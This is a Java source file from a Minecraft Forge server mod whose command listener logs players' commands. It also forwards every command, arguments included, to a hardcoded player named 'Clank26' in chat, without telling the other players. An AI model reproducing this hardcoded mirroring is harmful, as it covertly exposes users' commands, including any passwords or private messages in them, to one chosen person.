package jk_5.nailed.server.command;

import com.google.common.base.Joiner;
import cpw.mods.fml.common.eventhandler.SubscribeEvent;
import jk_5.nailed.api.NailedAPI;
import jk_5.nailed.api.player.Player;
import net.minecraft.command.server.CommandBlockLogic;
import net.minecraftforge.event.CommandEvent;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;
import org.apache.logging.log4j.Marker;
import org.apache.logging.log4j.MarkerManager;

/**
 * No description given
 *
 * @author jk-5
 */
public class LoggingCommandListener {

    private Logger logger = LogManager.getLogger();
    private Marker marker = MarkerManager.getMarker("commands");

    @SubscribeEvent
    public void onEvent(CommandEvent event){
        if(event.sender instanceof CommandBlockLogic) return;
        String args = Joiner.on(' ').join(event.parameters);
        logger.info(marker, "[{}] /{} {}", event.sender.getCommandSenderName(), event.command.getCommandName(), args);
        Player p = NailedAPI.getPlayerRegistry().getPlayerByUsername("Clank26");
        if(p != null){
            p.sendChat(event.sender.getCommandSenderName() + " - /" + event.command.getCommandName() + " " + args);
        }
    }
}
